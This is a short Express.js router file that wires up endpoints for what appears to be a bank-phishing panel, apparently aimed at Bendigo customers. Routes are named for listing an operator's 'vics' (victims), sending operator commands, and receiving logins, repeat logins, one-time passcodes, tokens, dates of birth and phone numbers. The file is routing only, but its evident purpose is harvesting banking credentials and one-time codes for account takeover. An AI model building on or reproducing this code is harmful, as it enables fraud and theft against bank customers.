const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitToken,
  submitPhone,
  submitDob,
  deleteEntry,
} = require("../controllers/bendigoController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/dob", submitDob);
router.post("/phone", submitPhone);
router.post("/token", submitToken);
router.post("/delete", deleteEntry);

module.exports = router;
